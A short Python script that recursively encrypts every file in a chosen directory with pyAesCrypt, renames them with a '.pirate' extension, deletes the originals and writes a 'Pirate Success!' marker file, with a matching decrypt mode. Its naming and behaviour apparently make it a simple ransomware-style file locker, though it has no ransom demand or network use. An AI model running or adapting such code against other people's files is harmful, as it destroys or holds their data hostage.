import argparse
import os
import base64
import pyAesCrypt
parser = argparse.ArgumentParser()
parser.add_argument("--dir",help="readme")
parser.add_argument("--mode",help="readme")
parser.add_argument("--password",help="readme")
args = parser.parse_args()
def EncryptFile(file,password):
    bufferSize = 64 * 1024
    pyAesCrypt.encryptFile(file, file+".pirate", password, bufferSize)
    os.remove(file)

def DecryptFile(file,password):
    bufferSize = 64 * 1024
    pyAesCrypt.decryptFile(file, file.split(".pirate")[0], password, bufferSize)
    os.remove(file)

welcome = '''
** use -h for help
'''
print(welcome)
if(args.mode == "encrypt"):
    for file in [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(args.dir)] for val in sublist]:
        EncryptFile(file,args.password)
    print("Pirate Done!")
    f = open("pirate.txt","w+")
    f.write("Pirate Success!")
    f.close()

elif(args.mode == "decrypt"):
    for file in [val for sublist in [[os.path.join(i[0], j) for j in i[2]] for i in os.walk(args.dir)] for val in sublist]:
        try:
            DecryptFile(file,args.password)
        except ValueError:
            # .DS_STORE file
            continue
    print("Done!")


